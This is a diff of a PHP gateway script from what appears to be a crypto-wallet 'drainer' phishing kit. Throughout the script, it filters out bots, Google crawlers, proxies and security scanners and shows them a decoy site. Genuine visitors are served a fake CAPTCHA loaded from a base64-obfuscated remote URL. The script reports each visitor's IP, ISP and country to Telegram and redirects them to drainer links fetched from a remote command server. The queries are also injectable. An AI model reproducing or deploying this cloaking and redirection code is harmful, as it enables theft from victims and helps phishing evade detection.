-    if (!$db) {
-        die("Connection failed: " . mysqli_connect_error());
-    }
-    $sql = "SELECT * FROM luxdataurl WHERE status = '0'";
-    $result = mysqli_query($db, $sql);
-    $links = [];
-    while ($row = mysqli_fetch_assoc($result)) {
-        $links[] = $row["luxurl"];
-    }
-    mysqli_close($db);
-    if (count($links) > 0) {
-        shuffle($links);
-        foreach ($links as $random_link) {
-            $safety_result = checkUrlSafety($random_link);
-            if ($safety_result === "Safe") {
-                return $random_link;
-            }
-        }
-        return "No safe URLs available.";
-    } else {
-        return "No URLs available.";
-    }
+function url_packet()
+{
+       global $fs_host, $fs_user, $fs_log, $fs_name;
+       $db = mysqli_connect($fs_host, $fs_user, $fs_log, $fs_name);
+       if (!$db) {
+              die("Connection failed: " . mysqli_connect_error());
+       }
+       $sql = "SELECT * FROM luxdataurl WHERE status = '0'";
+       $result = mysqli_query($db, $sql);
+       $links = [];
+       while ($row = mysqli_fetch_assoc($result)) {
+              $links[] = $row["luxurl"];
+       }
+       mysqli_close($db);
+       if (count($links) > 0) {
+              shuffle($links);
+              foreach ($links as $random_link) {
+                     $safety_result = checkUrlSafety($random_link);
+                     if ($safety_result === "Safe") {
+                            return $random_link;
+                     }
+              }
+              return "No safe URLs available.";
+       } else {
+              return "No URLs available.";
+       }
 }
-function log_visite($ip, $login_type) {
-    global $fs_host, $fs_user, $fs_log, $fs_name;
-    $country = $_SESSION["session_country"];
-    $isp = $_SESSION["session_isp"];
-    $project_to_visit = $_SESSION["project"];
-    $addby = $_SESSION["addby"];
-    $db = mysqli_connect($fs_host, $fs_user, $fs_log, $fs_name);
-    if (!$db) {
-        die("Connection failed: " . mysqli_connect_error());
-    }
-    $existingQuery = "SELECT COUNT(*) as count FROM visite WHERE ip = '$ip' AND addby = '$addby' AND project = '$project_to_visit'";
-    $result = $db->query($existingQuery);
-    if ($result && $result->fetch_assoc() ["count"] > 0) {
-        $db->close();
-        return;
-    }
-    $sql = "INSERT INTO visite (ip, country, isp, login_type, project, addby)
+function log_visite($ip, $login_type)
+{
+       global $fs_host, $fs_user, $fs_log, $fs_name;
+       $country = $_SESSION["session_country"];
+       $isp = $_SESSION["session_isp"];
+       $project_to_visit = $_SESSION["project"];
+       $addby = $_SESSION["addby"];
+       $db = mysqli_connect($fs_host, $fs_user, $fs_log, $fs_name);
+       if (!$db) {
+              die("Connection failed: " . mysqli_connect_error());
+       }
+       $existingQuery = "SELECT COUNT(*) as count FROM visite WHERE ip = '$ip' AND addby = '$addby' AND project = '$project_to_visit'";
+       $result = $db->query($existingQuery);
+       if ($result && $result->fetch_assoc()["count"] > 0) {
+              $db->close();
+              return;
+       }
+       $sql = "INSERT INTO visite (ip, country, isp, login_type, project, addby)
             VALUES ('$ip', '$country', '$isp', '$login_type', '$project_to_visit', '$addby')";
-    if ($db->query($sql) !== true) {
-        echo "Error: " . $sql . "<br>" . $db->error;
-    }
-    $db->close();
+       if ($db->query($sql) !== true) {
+              echo "Error: " . $sql . "<br>" . $db->error;
+       }
+       $db->close();
 }
-function check_proxy($ip) {
-    if ($_SESSION["session_proxy"] == "True") {
-        return ["message" => "Session variable", "real_ip" => $ip];
-    }
-    $url = "https://blackbox.ipinfo.app/lookup/" . $ip;
-    $ch = curl_init();
-    curl_setopt($ch, CURLOPT_URL, $url);
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
-    $resp = curl_exec($ch);
-    curl_close($ch);
-    if ($resp == "Y") {
-        return ["message" => "Geolocation discrepancies", "real_ip" => $ip];
-    }
-    return false;
+function check_proxy($ip)
+{
+       if ($_SESSION["session_proxy"] == "True") {
+              return ["message" => "Session variable", "real_ip" => $ip];
+       }
+       $url = "https://blackbox.ipinfo.app/lookup/" . $ip;
+       $ch = curl_init();
+       curl_setopt($ch, CURLOPT_URL, $url);
+       curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+       curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+       $resp = curl_exec($ch);
+       curl_close($ch);
+       if ($resp == "Y") {
+              return ["message" => "Geolocation discrepancies", "real_ip" => $ip];
+       }
+       return false;
 }
-function check_country() {
-    $session_country_code = strtolower($_SESSION["session_country_code"]);
-    foreach ($_SESSION["cn"] as $value) {
-        if (strtolower($value) == $session_country_code) {
-            return true;
-        }
-    }
-    return false;
+function check_country()
+{
+       $session_country_code = strtolower($_SESSION["session_country_code"]);
+       foreach ($_SESSION["cn"] as $value) {
+              if (strtolower($value) == $session_country_code) {
+                     return true;
+              }
+       }
+       return false;
 }
-function check_keyword($ipAddress) {
-    global $fs_host, $fs_user, $fs_log, $fs_name;
-    $db = mysqli_connect($fs_host, $fs_user, $fs_log, $fs_name);
-    if (!$db) {
-        die("Connection failed: " . mysqli_connect_error());
-    }
-    $sql = "SELECT * FROM mywording";
-    $result = mysqli_query($db, $sql);
-    $list_word = [];
-    while ($row = mysqli_fetch_assoc($result)) {
-        $list_word[] = strtolower($row["wording"]);
-    }
-    $isp = $_SESSION["session_isp"];
-    $host_name = gethostbyaddr($ipAddress);
-    $user_agent = isset($_SERVER["HTTP_USER_AGENT"]) ? $_SERVER["HTTP_USER_AGENT"] : "";
-    $ipAddressLower = strtolower($isp);
-    $host_nameLower = strtolower($host_name);
-    $user_agentLower = strtolower($user_agent);
-    foreach ($list_word as $word) {
-        if (stripos($ipAddressLower, $word) !== false || stripos($host_nameLower, $word) !== false || stripos($user_agentLower, $word) !== false) {
-            mysqli_close($db);
-            return $word;
-        }
-    }
-    mysqli_close($db);
-    return false;
+function check_keyword($ipAddress)
+{
+       global $fs_host, $fs_user, $fs_log, $fs_name;
+       $db = mysqli_connect($fs_host, $fs_user, $fs_log, $fs_name);
+       if (!$db) {
+              die("Connection failed: " . mysqli_connect_error());
+       }
+       $sql = "SELECT * FROM mywording";
+       $result = mysqli_query($db, $sql);
+       $list_word = [];
+       while ($row = mysqli_fetch_assoc($result)) {
+              $list_word[] = strtolower($row["wording"]);
+       }
+       $isp = $_SESSION["session_isp"];
+       $host_name = gethostbyaddr($ipAddress);
+       $user_agent = isset($_SERVER["HTTP_USER_AGENT"]) ? $_SERVER["HTTP_USER_AGENT"] : "";
+       $ipAddressLower = strtolower($isp);
+       $host_nameLower = strtolower($host_name);
+       $user_agentLower = strtolower($user_agent);
+       foreach ($list_word as $word) {
+              if (stripos($ipAddressLower, $word) !== false || stripos($host_nameLower, $word) !== false || stripos($user_agentLower, $word) !== false) {
+                     mysqli_close($db);
+                     return $word;
+              }
+       }
+       mysqli_close($db);
+       return false;
 }
-function send_command($ip, $url, $command, $id, $host) {
-    $userAgents = [
-        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36",
-        "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
-    ];
-    $randomUserAgent = $userAgents[array_rand($userAgents)];
-    $fields = [
-        "send_ip" => $ip,
-        "send_domain" => $url,
-        "return_domain" => $host,
-        "send_action" => $command,
-        "send_id" => $id
-    ];
-    $ch = curl_init();
-    curl_setopt($ch, CURLOPT_URL, $url);
-    curl_setopt($ch, CURLOPT_POST, 1);
-    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($fields));
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-    curl_setopt($ch, CURLOPT_USERAGENT, $randomUserAgent);
-	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); 
-    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false); 
-    $response = curl_exec($ch);
-    if (curl_errno($ch)) {
-        $error_message = curl_error($ch);
-        curl_close($ch);
-        return ["error" => "Curl error: " . $error_message];
-    }
-    curl_close($ch);
-    $result = json_decode($response, true);
-    return $result;
+function send_command($ip, $url, $command, $id, $host)
+{
+       $userAgents = [
+              "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36",
+              "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36",
+       ];
+       $randomUserAgent = $userAgents[array_rand($userAgents)];
+       $fields = [
+              "send_ip" => $ip,
+              "send_domain" => $url,
+              "return_domain" => $host,
+              "send_action" => $command,
+              "send_id" => $id,
+       ];
+       $ch = curl_init();
+       curl_setopt($ch, CURLOPT_URL, $url);
+       curl_setopt($ch, CURLOPT_POST, 1);
+       curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($fields));
+       curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+       curl_setopt($ch, CURLOPT_USERAGENT, $randomUserAgent);
+       curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+       curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
+       $response = curl_exec($ch);
+       if (curl_errno($ch)) {
+              $error_message = curl_error($ch);
+              curl_close($ch);
+              return ["error" => "Curl error: " . $error_message];
+       }
+       curl_close($ch);
+       $result = json_decode($response, true);
+       return $result;
 }
-function captcha_style($captcha, $last_url) {
-    $pro_ico = $_SESSION["pro_ico"];
-    $pro_color = $_SESSION["pro_color"];
-    $pro_msg = $_SESSION["pro_msg"];
-    $pro_img = $_SESSION["pro_img"];
-    $pro_logo = $_SESSION["pro_logo"];
-    $google_cap = $_SESSION["goole_cap"];
-    $h_captcha_key = $_SESSION["cloud_cap"];
-	$message_alert = $_SESSION["alert"];
-	if ($_SESSION["captcha_data"] == 0) {
-		$url = 'YUhSMGNITTZMeTl5WVhjdVoybDBhSFZpZFhObGNtTnZiblJsYm5RdVkyOXRMMnhqYjJ4aGQzbGxjbk12YzI5MWNtTmxMMjFoYVc0dlkyRndkR05vWVRBdWRIaDA';
-	}
-	if ($_SESSION["captcha_data"] == 1) {
-		$url = 'YUhSMGNITTZMeTl5WVhjdVoybDBhSFZpZFhObGNtTnZiblJsYm5RdVkyOXRMMnhqYjJ4aGQzbGxjbk12YzI5MWNtTmxMMjFoYVc0dlkyRndkR05vWVRFdWRIaDA';
-	}
-	$sour_enc = base64_decode(base64_decode($url));
-	$content = file_get_contents($sour_enc);
-	$number1 = rand(1, 10);
-	$number2 = rand(1, 10);
-	$captcha_res = $number1 + $number2;
-	$_SESSION["captcha"] = $captcha_res;
-	$country = $_SESSION["session_country"];
-	if ($_SESSION["session_country_code"] == 'FR'){
-		$message_bot = 'Aidez-nous à nous assurer que vous n\'êtes pas un robot';
-	}elseif($_SESSION["session_country_code"] == 'ES'){
-		$message_bot = 'Ayúdanos a asegurarnos de que no eres un robot';	
-	}elseif($_SESSION["session_country_code"] == 'RU'){
-		$message_bot = 'Помогите нам убедиться, что вы не робот';	
-	}elseif($_SESSION["session_country_code"] == 'JP'){
-		$message_bot = 'ロボットでないことを確認してください';	
-	}elseif($_SESSION["session_country_code"] == 'SA'){
-		$message_bot = 'ساعدنا في تأكيد هويتك';	
-	}else{
-		$message_bot = 'Help us make sure you are not a robot';
-	}
-	$processedContent = str_replace('$number1', $number1, $content);
-	$processedContent = str_replace('$number2', $number2,$processedContent);
-	$processedContent = str_replace('$captcha_res',$captcha_res,$processedContent);
-	$processedContent = str_replace('$pro_logo',$pro_logo,$processedContent);
-	$processedContent = str_replace('$message_alert',$message_alert,$processedContent);
-	$processedContent = str_replace('$country',$country,$processedContent);
-	$processedContent = str_replace('$message_bot',$message_bot,$processedContent);
-	$processedContent = str_replace('$h_captcha_key',$h_captcha_key,$processedContent);
-	$processedContent = str_replace('$last_url',$last_url,$processedContent);
-	$processedContent = str_replace('$pro_color',$pro_color,$processedContent);
-    
-    return $processedContent;
+function captcha_style($captcha, $last_url)
+{
+       $pro_ico = $_SESSION["pro_ico"];
+       $pro_color = $_SESSION["pro_color"];
+       $pro_msg = $_SESSION["pro_msg"];
+       $pro_img = $_SESSION["pro_img"];
+       $pro_logo = $_SESSION["pro_logo"];
+       $google_cap = $_SESSION["goole_cap"];
+       $h_captcha_key = $_SESSION["cloud_cap"];
+       $message_alert = $_SESSION["alert"];
+       if ($_SESSION["captcha_data"] == 0) {
+              $url = 'YUhSMGNITTZMeTl5WVhjdVoybDBhSFZpZFhObGNtTnZiblJsYm5RdVkyOXRMMnhqYjJ4aGQzbGxjbk12YzI5MWNtTmxMMjFoYVc0dlkyRndkR05vWVRBdWRIaDA';
+       }
+       if ($_SESSION["captcha_data"] == 1) {
+              $url = 'YUhSMGNITTZMeTl5WVhjdVoybDBhSFZpZFhObGNtTnZiblJsYm5RdVkyOXRMMnhqYjJ4aGQzbGxjbk12YzI5MWNtTmxMMjFoYVc0dlkyRndkR05vWVRFdWRIaDA';
+       }
+       $sour_enc = base64_decode(base64_decode($url));
+       $content = file_get_contents($sour_enc);
+       $number1 = rand(1, 10);
+       $number2 = rand(1, 10);
+       $captcha_res = $number1 + $number2;
+       $_SESSION["captcha"] = $captcha_res;
+       $country = $_SESSION["session_country"];
+       if ($_SESSION["session_country_code"] == 'FR') {
+              $message_bot = 'Aidez-nous à nous assurer que vous n\'êtes pas un robot';
+       } elseif ($_SESSION["session_country_code"] == 'ES') {
+              $message_bot = 'Ayúdanos a asegurarnos de que no eres un robot';
+       } elseif ($_SESSION["session_country_code"] == 'RU') {
+              $message_bot = 'Помогите нам убедиться, что вы не робот';
+       } elseif ($_SESSION["session_country_code"] == 'JP') {
+              $message_bot = 'ロボットでないことを確認してください';
+       } elseif ($_SESSION["session_country_code"] == 'SA') {
+              $message_bot = 'ساعدنا في تأكيد هويتك';
+       } else {
+              $message_bot = 'Help us make sure you are not a robot';
+       }
+       $processedContent = str_replace('$number1', $number1, $content);
+       $processedContent = str_replace('$number2', $number2, $processedContent);
+       $processedContent = str_replace('$captcha_res', $captcha_res, $processedContent);
+       $processedContent = str_replace('$pro_logo', $pro_logo, $processedContent);
+       $processedContent = str_replace('$message_alert', $message_alert, $processedContent);
+       $processedContent = str_replace('$country', $country, $processedContent);
+       $processedContent = str_replace('$message_bot', $message_bot, $processedContent);
+       $processedContent = str_replace('$h_captcha_key', $h_captcha_key, $processedContent);
+       $processedContent = str_replace('$last_url', $last_url, $processedContent);
+       $processedContent = str_replace('$pro_color', $pro_color, $processedContent);
+
+       return $processedContent;
 }
-function url_drain() {
-    global $fs_host, $fs_user, $fs_log, $fs_name;
-    $db = mysqli_connect($fs_host, $fs_user, $fs_log, $fs_name);
-    if (!$db) {
-        die("Connection failed: " . mysqli_connect_error());
-    }
-    $sql = "SELECT * FROM luxdataurl WHERE status = '2'";
-    $result = mysqli_query($db, $sql);
-    $links = [];
-    while ($row = mysqli_fetch_assoc($result)) {
-        $links[] = $row["luxurl"];
-    }
-    mysqli_close($db);
-    if (count($links) > 0) {
-        shuffle($links);
-        foreach ($links as $random_link) {
-            $safety_result = checkUrlSafety($random_link);
-            if ($safety_result === "Safe") {
-                return $random_link;
-            }
-        }
-        return "No safe URLs available.";
-    } else {
-        return "No URLs available.";
-    }
+function url_drain()
+{
+       global $fs_host, $fs_user, $fs_log, $fs_name;
+       $db = mysqli_connect($fs_host, $fs_user, $fs_log, $fs_name);
+       if (!$db) {
+              die("Connection failed: " . mysqli_connect_error());
+       }
+       $sql = "SELECT * FROM luxdataurl WHERE status = '2'";
+       $result = mysqli_query($db, $sql);
+       $links = [];
+       while ($row = mysqli_fetch_assoc($result)) {
+              $links[] = $row["luxurl"];
+       }
+       mysqli_close($db);
+       if (count($links) > 0) {
+              shuffle($links);
+              foreach ($links as $random_link) {
+                     $safety_result = checkUrlSafety($random_link);
+                     if ($safety_result === "Safe") {
+                            return $random_link;
+                     }
+              }
+              return "No safe URLs available.";
+       } else {
+              return "No URLs available.";
+       }
 }
-function user_drain($ipAddress, $id) {
-    global $fs_host, $fs_user, $fs_log, $fs_name;
-    $db = mysqli_connect($fs_host, $fs_user, $fs_log, $fs_name);
-    if (!$db) {
-        die("Connection failed: " . mysqli_connect_error());
-    }
-    $sql_u = "SELECT * FROM drain WHERE private_key='$id'";
-    $res_u = mysqli_query($db, $sql_u);
-    if (mysqli_num_rows($res_u) > 0) {
-        while ($row = mysqli_fetch_array($res_u)) {
-            $_SESSION["tokentel"] = $row["project_tel_token"];
-            $_SESSION["idtel"] = $row["project_tel_id"];
-            $_SESSION["project"] = $row["project_name"];
-        }
-    } else {
-        $reason = "drain not found $id";
-        banned_client($ipAddress, $reason);
-        die();
-    }
-    mysqli_close($db);
+function user_drain($ipAddress, $id)
+{
+       global $fs_host, $fs_user, $fs_log, $fs_name;
+       $db = mysqli_connect($fs_host, $fs_user, $fs_log, $fs_name);
+       if (!$db) {
+              die("Connection failed: " . mysqli_connect_error());
+       }
+       $sql_u = "SELECT * FROM drain WHERE private_key='$id'";
+       $res_u = mysqli_query($db, $sql_u);
+       if (mysqli_num_rows($res_u) > 0) {
+              while ($row = mysqli_fetch_array($res_u)) {
+                     $_SESSION["tokentel"] = $row["project_tel_token"];
+                     $_SESSION["idtel"] = $row["project_tel_id"];
+                     $_SESSION["project"] = $row["project_name"];
+              }
+       } else {
+              $reason = "drain not found $id";
+              banned_client($ipAddress, $reason);
+              die();
+       }
+       mysqli_close($db);
 }
 $ipAddress = getClientIP(); //'86.241.13.82';//
 fetchIPInfo($ipAddress);
 $com_drain = isset($_GET["web3"]) ? $_GET["web3"] : null;
 if (detect_user($ipAddress)) {
-    http_response_code(405);
-    $responseData = ["res_status" => "405", "message" => "user blacklisted", ];
-    $responseJson = json_encode($responseData);
-   # echo $responseJson;
-	echo show_website();
-    die();
+       http_response_code(405);
+       $responseData = ["res_status" => "405", "message" => "user blacklisted"];
+       $responseJson = json_encode($responseData);
+       # echo $responseJson;
+       echo show_website();
+       die();
 }
 if (is_bot_ip($ipAddress)) {
-    $reson = "spam ip";
-    banned_client($ipAddress, $reson);
-    http_response_code(405);
-    $responseData = ["res_status" => "405", "message" => $reason, ];
-    $responseJson = json_encode($responseData);
-    #echo $responseJson;
-	echo show_website();
-    die();
+       $reson = "spam ip";
+       banned_client($ipAddress, $reson);
+       http_response_code(405);
+       $responseData = ["res_status" => "405", "message" => $reason];
+       $responseJson = json_encode($responseData);
+       #echo $responseJson;
+       echo show_website();
+       die();
 }
 if (isGoogleUser($local_userAgent, $ipAddress)) {
-    $reson = "Google ip";
-    banned_client($ipAddress, $reson);
-    http_response_code(405);
-    $responseData = ["res_status" => "405", "message" => $reason, ];
-    $responseJson = json_encode($responseData);
-    #echo $responseJson;
-	echo show_website();
-    die();
+       $reson = "Google ip";
+       banned_client($ipAddress, $reson);
+       http_response_code(405);
+       $responseData = ["res_status" => "405", "message" => $reason];
+       $responseJson = json_encode($responseData);
+       #echo $responseJson;
+       echo show_website();
+       die();
 }
 if ($com_drain !== null) {
-    $res_ip = $ipAddress;
-    $country = $_SESSION["session_country"];
-    $project = $_SESSION["project"];
-    $protection = "Basic Protect V2.1";
-    $isp = $_SESSION["session_isp"];
-    $client = base64_decode(base64_decode($_GET["web3"]));
-    $url_redi = url_drain();
-    log_visite($ipAddress, "3");
-    user_drain($ipAddress, $client);
-    $message = "
+       $res_ip = $ipAddress;
+       $country = $_SESSION["session_country"];
+       $project = $_SESSION["project"];
+       $protection = "Basic Protect V2.1";
+       $isp = $_SESSION["session_isp"];
+       $client = base64_decode(base64_decode($_GET["web3"]));
+       $url_redi = url_drain();
+       log_visite($ipAddress, "3");
+       user_drain($ipAddress, $client);
+       $message = "
 🏄‍♂️ 🅽🅴🆆 🆅🅸🆂🅸🆃🅴  (Drainer)
 --------------------------------------------
 📡  𝗜𝗣: {$res_ip}
@@ -605,19 +671,19 @@ if ($com_drain !== null) {
 🌐  𝗨𝗥𝗟: {$url_redi}
 🎫  𝗗𝗮𝘁𝗲/𝘁𝗶𝗺𝗲: {$local_time}
 --------------------------------------------";
-    tele_message($message);
-    header("Location: $url_redi?userid=$client");
-    die();
+       tele_message($message);
+       header("Location: $url_redi?userid=$client");
+       die();
 }
 if (empty($_GET["iduser"])) {
-    $reason = "invalid user";
-    banned_client($ipAddress, $reason);
-    http_response_code(405);
-    $responseData = ["res_status" => "405", "message" => $reason, ];
-    $responseJson = json_encode($responseData);
-   # echo $responseJson;
-	echo show_website();
-    die();
+       $reason = "invalid user";
+       banned_client($ipAddress, $reason);
+       http_response_code(405);
+       $responseData = ["res_status" => "405", "message" => $reason];
+       $responseJson = json_encode($responseData);
+       # echo $responseJson;
+       echo show_website();
+       die();
 }
 $userid = isset($_GET['iduser']) ? $_GET['iduser'] : null;
 $useriddec = base64_decode(base64_decode($userid));
@@ -625,84 +691,81 @@ user_data($ipAddress, $useriddec);
 log_visite($ipAddress, "0");
 $keyword = check_keyword($ipAddress);
 if ($_SESSION["proxy"] == 1) {
-    $check_proxy = check_proxy($ipAddress);
-    if ($check_proxy) {
-        $reason = "proxy";
-        banned_client($ipAddress, $reason);
-        http_response_code(405);
-        $responseData = ["res_status" => "405", "message" => $reason, ];
-        $responseJson = json_encode($responseData);
-       # echo $responseJson;
-		echo show_website();
-        die();
-    }
+       $check_proxy = check_proxy($ipAddress);
+       if ($check_proxy) {
+              $reason = "proxy";
+              banned_client($ipAddress, $reason);
+              http_response_code(405);
+              $responseData = ["res_status" => "405", "message" => $reason];
+              $responseJson = json_encode($responseData);
+              # echo $responseJson;
+              echo show_website();
+              die();
+       }
 }
 if (!check_country()) {
-    $reason = "invalid country";
-    banned_client($ipAddress, $reason);
-    http_response_code(405);
-    $responseData = ["res_status" => "405", "message" => $reason, ];
-    $responseJson = json_encode($responseData);
-    #echo $responseJson;
-	echo show_website();
-    die();
+       $reason = "invalid country";
+       banned_client($ipAddress, $reason);
+       http_response_code(405);
+       $responseData = ["res_status" => "405", "message" => $reason];
+       $responseJson = json_encode($responseData);
+       #echo $responseJson;
+       echo show_website();
+       die();
 }
 if ($keyword !== false) {
-    $reason = "keyword:$keyword";
-    banned_client($ipAddress, $reason);
-    http_response_code(405);
-    $responseData = ["res_status" => "405", "message" => "invalid key", ];
-    $responseJson = json_encode($responseData);
-  #  echo $responseJson;
-	echo show_website();
-    die();
+       $reason = "keyword:$keyword";
+       banned_client($ipAddress, $reason);
+       http_response_code(405);
+       $responseData = ["res_status" => "405", "message" => "invalid key"];
+       $responseJson = json_encode($responseData);
+       #  echo $responseJson;
+       echo show_website();
+       die();
 }
 if ($_SERVER["REQUEST_METHOD"] === "POST") {
-    $captcha_res = isset($_POST["captcha_res"]) ? $_POST["captcha_res"] : null;
-    $captcha_send = isset($_POST["captcha_send"]) ? $_POST["captcha_send"] : null;
-    if ($captcha_res == $captcha_send) {
-        $_SESSION["alert"] = "";
-        $url = $_SESSION["domaincall"];
-        header("Location: $url");
-        die();
-    } else {
-        $_SESSION["alert"] = "Incorrect Captcha";
-    }
+       $captcha_res = isset($_POST["captcha_res"]) ? $_POST["captcha_res"] : null;
+       $captcha_send = isset($_POST["captcha_send"]) ? $_POST["captcha_send"] : null;
+       if ($captcha_res == $captcha_send) {
+              $_SESSION["alert"] = "";
+              $url = $_SESSION["domaincall"];
+              header("Location: $url");
+              die();
+       } else {
+              $_SESSION["alert"] = "Incorrect Captcha";
+       }
 }
 
-do {
-	$log = url_packet();
-    $result = send_command($ipAddress, $log, "create", $useriddec, $local_domain);
-    
-    
-    // Check if the task was successful
-    $success = isset($result["res_status"]) && $result["res_status"] == "success";
-    
-    if (!$success) {
-        // Sleep for a bit before retrying to avoid hammering the server
-        sleep(2); // Wait for 5 seconds before retrying
-    }else{
-		if (isset($result["res_status"]) && $result["res_status"] == "success") {
-    $res_dir = $result["res_dir"];
-    $res_url = $result["res_url"];
-    $res_id = $result["res_id"];
-    $res_ip = $result["res_ip"];
-    $res_action = $result["res_action"];
-    $country = $_SESSION["session_country"];
-    $project = $_SESSION["project"];
-    $protection = "Zero Day Captcha";
-    $isp = $_SESSION["session_isp"];
-    $captcha_data = $_SESSION["captcha_data"];
-    $google_cap = $_SESSION["goole_cap"];
-    $cloud_cap = $_SESSION["cloud_cap"];
-    $domaincall = "$res_url/?local=/$res_dir&souls=$res_id&remote=$res_ip";
-    $_SESSION["domaincall"] = $domaincall;
-    $dateexp = $_SESSION['expire_date'];
-    $expireTimestamp = strtotime($dateexp);
-    $currentTimestamp = time();
-    if ($currentTimestamp >= $expireTimestamp) {
-   
-        $message = "
+$success = false;
+while (!$success) {
+       $log = url_packet();
+       $result = send_command($ipAddress, $log, "create", $useriddec, $local_domain);
+
+       // Check if the task was successful
+       $success = isset($result["res_status"]) && $result["res_status"] == "success";
+       if (!$success) {
+              // Sleep for a bit before retrying to avoid hammering the server
+              sleep(2); // Wait for 5 seconds before retrying
+       } else {
+              $res_dir = $result["res_dir"];
+              $res_url = $result["res_url"];
+              $res_id = $result["res_id"];
+              $res_ip = $result["res_ip"];
+              $res_action = $result["res_action"];
+              $country = $_SESSION["session_country"];
+              $project = $_SESSION["project"];
+              $protection = "Zero Day Captcha";
+              $isp = $_SESSION["session_isp"];
+              $captcha_data = $_SESSION["captcha_data"];
+              $google_cap = $_SESSION["goole_cap"];
+              $cloud_cap = $_SESSION["cloud_cap"];
+              $domaincall = "$res_url/?local=/$res_dir&souls=$res_id&remote=$res_ip";
+              $_SESSION["domaincall"] = $domaincall;
+              $dateexp = $_SESSION['expire_date'];
+              $expireTimestamp = strtotime($dateexp);
+              $currentTimestamp = time();
+              if ($currentTimestamp >= $expireTimestamp) {
+                     $message = "
 ❌ 🅽🅴🆆 🆅🅸🆂🅸🆃🅴 (Expired)
 Your Link is Expired Result Will be hidden
 Try to Reactive your Bulletproof Now!!
@@ -716,12 +779,12 @@ https://www.zero-day.shop/bulletproof/price/
 ❌  𝗨𝗥𝗟: {$res_url}
 ❌  𝗗𝗮𝘁𝗲/𝘁𝗶𝗺𝗲: {$local_time}
 --------------------------------------------";
-        tele_message($message);
-    }
-    if ($captcha_data == 0) {
-        $protection = "Zero Day Captcha";
-        $html = captcha_style(0, $domaincall);
-        $message = "
+                     tele_message($message);
+              }
+              if ($captcha_data == 0) {
+                     $protection = "Zero Day Captcha";
+                     $html = captcha_style(0, $domaincall);
+                     $message = "
 🏄‍♂️ 🅽🅴🆆 🆅🅸🆂🅸🆃🅴
 --------------------------------------------
 📡  𝗜𝗣: {$res_ip}
@@ -732,12 +795,12 @@ https://www.zero-day.shop/bulletproof/price/
 🌐  𝗨𝗥𝗟: {$log}
 🎫  𝗗𝗮𝘁𝗲/𝘁𝗶𝗺𝗲: {$local_time}
 --------------------------------------------";
-        tele_message($message);
-        echo $html;
-    } elseif ($captcha_data == 1) {
-        $protection = "h-Captcha";
-        $html = captcha_style(1, $domaincall);
-        $message = "
+                     tele_message($message);
+                     echo $html;
+              } elseif ($captcha_data == 1) {
+                     $protection = "h-Captcha";
+                     $html = captcha_style(1, $domaincall);
+                     $message = "
 🏄‍♂️ 🅽🅴🆆 🆅🅸🆂🅸🆃🅴
 --------------------------------------------
 📡  𝗜𝗣: {$res_ip}
@@ -748,12 +811,12 @@ https://www.zero-day.shop/bulletproof/price/
 🌐  𝗨𝗥𝗟: {$log}
 🎫  𝗗𝗮𝘁𝗲/𝘁𝗶𝗺𝗲: {$local_time}
 --------------------------------------------";
-        tele_message($message);
-        echo $html;
-    } elseif ($captcha_data == 2) {
-        $protection = "Cloudflare Captcha";
-        $html = captcha_style(2, $domaincall);
-        $message = "
+                     tele_message($message);
+                     echo $html;
+              } elseif ($captcha_data == 2) {
+                     $protection = "Cloudflare Captcha";
+                     $html = captcha_style(2, $domaincall);
+                     $message = "
 🏄‍♂️ 🅽🅴🆆 🆅🅸🆂🅸🆃🅴
 --------------------------------------------
 📡  𝗜𝗣: {$res_ip}
@@ -764,23 +827,23 @@ https://www.zero-day.shop/bulletproof/price/
 🌐  𝗨𝗥𝗟: {$log}
 🎫  𝗗𝗮𝘁𝗲/𝘁𝗶𝗺𝗲: {$local_time}
 --------------------------------------------";
-        tele_message($message);
-        echo $html;
-    } elseif ($captcha_data == 3) {
-        $protection = "NO Captcha";
-        $check_proxy = check_proxy($ipAddress);
-        if ($check_proxy) {
-            $reason = "proxy";
-            banned_client($ipAddress, $reason);
-            http_response_code(405);
-            $responseData = ["res_status" => "405", "message" => $reason, ];
-            $responseJson = json_encode($responseData);
-          #  echo $responseJson;
-			echo show_website();
-            die();
-        } else {
-            $url = $_SESSION["domaincall"];
-            $message = "
+                     tele_message($message);
+                     echo $html;
+              } elseif ($captcha_data == 3) {
+                     $protection = "NO Captcha";
+                     $check_proxy = check_proxy($ipAddress);
+                     if ($check_proxy) {
+                            $reason = "proxy";
+                            banned_client($ipAddress, $reason);
+                            http_response_code(405);
+                            $responseData = ["res_status" => "405", "message" => $reason];
+                            $responseJson = json_encode($responseData);
+                            #  echo $responseJson;
+                            echo show_website();
+                            die();
+                     } else {
+                            $url = $_SESSION["domaincall"];
+                            $message = "
 🏄‍♂️ 🅽🅴🆆 🆅🅸🆂🅸🆃🅴
 --------------------------------------------
 📡  𝗜𝗣: {$res_ip}
@@ -791,17 +854,14 @@ https://www.zero-day.shop/bulletproof/price/
 🌐  𝗨𝗥𝗟: {$log}
 🎫  𝗗𝗮𝘁𝗲/𝘁𝗶𝗺𝗲: {$local_time}
 --------------------------------------------";
-            tele_message($message);
-            header("Location: $url");
-            die();
-        }
-    } elseif ($captcha_data == 4) {
-        $protection = "Google Captcha";
-    }
+                            tele_message($message);
+                            header("Location: $url");
+                            die();
+                     }
+              } elseif ($captcha_data == 4) {
+                     $protection = "Google Captcha";
+              }
+       }
 }
-
-		
-	}
-} while (!$success);
 
 ?>
